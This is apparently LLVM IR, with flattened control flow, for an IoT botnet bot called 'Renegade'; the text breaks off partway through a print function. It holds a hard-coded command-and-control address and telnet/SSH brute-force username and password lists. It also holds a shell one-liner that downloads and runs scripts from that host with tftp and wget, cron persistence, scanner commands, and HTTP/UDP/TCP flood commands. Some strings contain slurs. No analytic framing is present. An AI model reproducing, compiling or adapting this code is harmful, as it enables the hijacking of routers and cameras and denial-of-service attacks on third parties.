; ModuleID = 'host/ir_fla/Renegade.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.udphdr = type { %union.anon.3 }
%union.anon.3 = type { %struct.anon.4 }
%struct.anon.4 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@commServer = global [1 x i8*] [i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [21 x i8] c"94.140.120.196:23913\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@usernames = global [10 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.10, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"ubnt\00\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"D-Link\00\00", align 1
@.str.9 = private unnamed_addr constant [4 x i8] c"pi\00\00", align 1
@.str.10 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@passwords = global [18 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.10, i32 0, i32 0)], align 16
@.str.11 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.12 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.13 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.14 = private unnamed_addr constant [10 x i8] c"dreambox\00\00", align 1
@.str.15 = private unnamed_addr constant [9 x i8] c"letmein\00\00", align 1
@.str.16 = private unnamed_addr constant [12 x i8] c"epicrouter\00\00", align 1
@.str.17 = private unnamed_addr constant [11 x i8] c"raspberry\00\00", align 1
@.str.18 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.85 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.19 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal global i32* null, align 8
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.20 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.21 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.22 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.23 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@ipState = internal global [5 x i8] zeroinitializer, align 1
@.str.24 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.25 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.26 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.27 = private unnamed_addr constant [5 x i8] c"user\00", align 1
@.str.28 = private unnamed_addr constant [5 x i8] c"pass\00", align 1
@.str.29 = private unnamed_addr constant [5 x i8] c"name\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"word\00", align 1
@.str.31 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [8 x i8] c"invalid\00", align 1
@.str.33 = private unnamed_addr constant [10 x i8] c"incorrect\00", align 1
@.str.34 = private unnamed_addr constant [5 x i8] c"fail\00", align 1
@.str.35 = private unnamed_addr constant [6 x i8] c"again\00", align 1
@.str.36 = private unnamed_addr constant [6 x i8] c"wrong\00", align 1
@.str.37 = private unnamed_addr constant [13 x i8] c"accessdenied\00", align 1
@.str.38 = private unnamed_addr constant [6 x i8] c"error\00", align 1
@.str.39 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@.str.40 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.41 = private unnamed_addr constant [193 x i8] c"cd /tmp || cd /var/run;rm -f ng.sh gchq.sh;tftp -r ng.sh -g 94.140.120.196;chmod +x ng.sh;sh ng.sh;rm -f ng.sh;wget -q http://94.140.120.196/gchq.sh;chmod +x gchq.sh;sh gchq.sh;rm -f gchq.sh\0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [3 x i8] c"as\00", align 1
@.str.43 = private unnamed_addr constant [10 x i8] c"/bin/sh\0D\0A\00", align 1
@.str.44 = private unnamed_addr constant [13 x i8] c"shell exec\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.46 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.47 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.48 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.49 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.50 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.51 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.52 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.53 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.54 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.55 = private unnamed_addr constant [17 x i8] c"wget -O /tmp/fff\00", align 1
@.str.56 = private unnamed_addr constant [14 x i8] c" > /dev/null \00", align 1
@.str.57 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.58 = private unnamed_addr constant [14 x i8] c"FUCKINGFAGGOT\00", align 1
@.str.59 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.60 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.61 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.62 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.63 = private unnamed_addr constant [33 x i8] c"SCANNER SSH/TEL ON | SSH/TEL OFF\00", align 1
@.str.64 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.65 = private unnamed_addr constant [10 x i8] c"tel d0rk\0A\00", align 1
@.str.66 = private unnamed_addr constant [7 x i8] c"TEL ON\00", align 1
@.str.67 = private unnamed_addr constant [10 x i8] c"tel f0rk\0A\00", align 1
@.str.68 = private unnamed_addr constant [7 x i8] c"SSH ON\00", align 1
@.str.69 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.70 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.71 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.72 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.73 = private unnamed_addr constant [11 x i8] c"Killed %d.\00", align 1
@.str.74 = private unnamed_addr constant [13 x i8] c"None Killed.\00", align 1
@.str.75 = private unnamed_addr constant [13 x i8] c"LUCKYLILDUDE\00", align 1
@.str.76 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.77 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.78 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@main.ismokeweed = private unnamed_addr constant [50 x i8] c"/etc/cron.hourly/sockaddr\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 16
@main.r00t3d = private unnamed_addr constant [11 x i8] c"shell exec\00", align 1
@.str.79 = private unnamed_addr constant [3 x i8] c"w+\00", align 1
@.str.80 = private unnamed_addr constant [13 x i8] c"fork failed\0A\00", align 1
@.str.81 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.82 = private unnamed_addr constant [8 x i8] c"FUCKYOU\00", align 1
@.str.83 = private unnamed_addr constant [14 x i8] c"GUCCILILNIGGA\00", align 1
@.str.84 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  %switchVar = alloca i32
  store i32 -1794159992, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1794159992, label %10
    i32 1644726231, label %14
    i32 -1413672734, label %32
    i32 2115901535, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  %13 = select i1 %12, i32 1644726231, i32 2115901535
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i32, i32* %3, align 4
  %16 = sub nsw i32 %15, 3
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %17
  %19 = load i32, i32* %18, align 4
  %20 = load i32, i32* %3, align 4
  %21 = sub nsw i32 %20, 2
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %22
  %24 = load i32, i32* %23, align 4
  %25 = xor i32 %19, %24
  %26 = xor i32 %25, -1640531527
  %27 = load i32, i32* %3, align 4
  %28 = xor i32 %26, %27
  %29 = load i32, i32* %3, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %30
  store i32 %28, i32* %31, align 4
  store i32 -1413672734, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i32, i32* %3, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* %3, align 4
  store i32 -1794159992, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %32, %14, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %.reg2mem2 = alloca i32
  %.reg2mem = alloca i32
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  store i32 %26, i32* %.reg2mem
  %27 = load i32, i32* @c, align 4
  store i32 %27, i32* %.reg2mem2
  %switchVar = alloca i32
  store i32 7749681, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 7749681, label %first
    i32 1355713513, label %30
    i32 340451011, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %.reload3 = load volatile i32, i32* %.reg2mem2
  %28 = icmp ult i32 %.reload, %.reload3
  %29 = select i1 %28, i32 1355713513, i32 340451011
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32, i32* %3, align 4
  %32 = add i32 %31, 1
  store i32 %32, i32* %3, align 4
  %33 = load i32, i32* @c, align 4
  %34 = add i32 %33, 1
  store i32 %34, i32* @c, align 4
  store i32 340451011, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %4, align 4
  %37 = load i32, i32* %3, align 4
  %38 = sub i32 %36, %37
  %39 = load i32, i32* @rand_cmwc.i, align 4
  %40 = zext i32 %39 to i64
  %41 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %40
  store i32 %38, i32* %41, align 4
  ret i32 %38

loopEnd:                                          ; preds = %30, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  %switchVar = alloca i32
  store i32 820574249, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 820574249, label %10
    i32 -603598670, label %20
    i32 816590047, label %23
    i32 -1261578991, label %24
    i32 -1421519383, label %29
    i32 991448838, label %38
    i32 -1038318656, label %40
    i32 598582614, label %43
    i32 -772218663, label %45
    i32 1350441647, label %50
    i32 -1750254638, label %62
    i32 1536122325, label %65
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #10
  %18 = icmp ne i32 %17, 0
  %19 = select i1 %18, i32 -603598670, i32 816590047
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %4, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %4, align 4
  store i32 820574249, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  store i32 -1261578991, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %5, align 4
  %26 = load i32, i32* %4, align 4
  %27 = icmp sge i32 %25, %26
  %28 = select i1 %27, i32 -1421519383, i32 991448838
  store i32 %28, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i8*, i8** %2, align 8
  %31 = load i32, i32* %5, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %30, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = call i32 @isspace(i32 %35) #10
  %37 = icmp ne i32 %36, 0
  store i32 991448838, i32* %switchVar
  store i1 %37, i1* %.reg2mem
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %39 = select i1 %.reload, i32 -1038318656, i32 598582614
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %5, align 4
  %42 = add nsw i32 %41, -1
  store i32 %42, i32* %5, align 4
  store i32 -1261578991, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i32, i32* %4, align 4
  store i32 %44, i32* %3, align 4
  store i32 -772218663, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %3, align 4
  %47 = load i32, i32* %5, align 4
  %48 = icmp sle i32 %46, %47
  %49 = select i1 %48, i32 1350441647, i32 1536122325
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %2, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = load i8*, i8** %2, align 8
  %57 = load i32, i32* %3, align 4
  %58 = load i32, i32* %4, align 4
  %59 = sub nsw i32 %57, %58
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %56, i64 %60
  store i8 %55, i8* %61, align 1
  store i32 -1750254638, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %3, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %3, align 4
  store i32 -772218663, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i8*, i8** %2, align 8
  %67 = load i32, i32* %3, align 4
  %68 = load i32, i32* %4, align 4
  %69 = sub nsw i32 %67, %68
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8, i8* %66, i64 %70
  store i8 0, i8* %71, align 1
  ret void

loopEnd:                                          ; preds = %62, %50, %45, %43, %40, %38, %29, %24, %23, %20, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %.reg2mem72 = alloca i32
  %.reg2mem69 = alloca i32*
  %.reg2mem65 = alloca %struct.__va_list_tag*
  %.reg2mem61 = alloca i32
  %.reg2mem58 = alloca i32*
  %.reg2mem54 = alloca %struct.__va_list_tag*
  %.reg2mem52 = alloca i8**
  %.reg2mem48 = alloca i32
  %.reg2mem45 = alloca i32*
  %.reg2mem41 = alloca %struct.__va_list_tag*
  %.reg2mem39 = alloca i8**
  %.reg2mem35 = alloca i32
  %.reg2mem32 = alloca i32*
  %.reg2mem28 = alloca %struct.__va_list_tag*
  %.reg2mem26 = alloca i8**
  %.reg2mem22 = alloca i32
  %.reg2mem19 = alloca i32*
  %.reg2mem15 = alloca %struct.__va_list_tag*
  %.reg2mem13 = alloca i8**
  %.reg2mem11 = alloca i8**
  %.reg2mem7 = alloca i32
  %.reg2mem4 = alloca i32*
  %.reg2mem = alloca %struct.__va_list_tag*
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  %switchVar = alloca i32
  store i32 -287398973, i32* %switchVar
  %.reg2mem76 = alloca i1
  %.reg2mem78 = alloca i32*
  %.reg2mem80 = alloca i8*
  %.reg2mem82 = alloca i32*
  %.reg2mem84 = alloca i32*
  %.reg2mem86 = alloca i32*
  %.reg2mem88 = alloca i32*
  %.reg2mem90 = alloca i32*
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -287398973, label %12
    i32 -553176304, label %18
    i32 245514027, label %24
    i32 -531896579, label %32
    i32 -561773542, label %33
    i32 -2056796477, label %39
    i32 2093379696, label %40
    i32 1883069663, label %46
    i32 -1434724283, label %49
    i32 -1830493780, label %50
    i32 -260970835, label %56
    i32 -1316294091, label %61
    i32 -1614826920, label %62
    i32 -2030489573, label %68
    i32 736021250, label %73
    i32 1558300560, label %75
    i32 -2032373310, label %84
    i32 -1705232074, label %87
    i32 -1888212462, label %93
    i32 252251727, label %99
    i32 -1647431711, label %105
    i32 1170784223, label %110
    i32 622163159, label %118
    i32 -177407630, label %120
    i32 129371920, label %121
    i32 817722917, label %127
    i32 885051637, label %133
    i32 -1071242393, label %140
    i32 45310766, label %146
    i32 -219115567, label %151
    i32 41653547, label %158
    i32 1923293691, label %164
    i32 1945442492, label %171
    i32 1283881351, label %177
    i32 1799815531, label %182
    i32 -2039231744, label %189
    i32 -930347478, label %195
    i32 -1958011770, label %202
    i32 479779934, label %208
    i32 -445001715, label %213
    i32 2049113017, label %220
    i32 1766049930, label %226
    i32 -1183344936, label %233
    i32 66723994, label %239
    i32 -1768743503, label %244
    i32 -1542311643, label %251
    i32 -475155827, label %257
    i32 -639026310, label %263
    i32 -1170678610, label %269
    i32 571854213, label %274
    i32 1799409322, label %286
    i32 533973829, label %287
    i32 -2106042395, label %288
    i32 -1529240999, label %295
    i32 -1990727210, label %296
    i32 842243396, label %299
    i32 -197636550, label %303
    i32 1949505073, label %306
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i8*, i8** %5, align 8
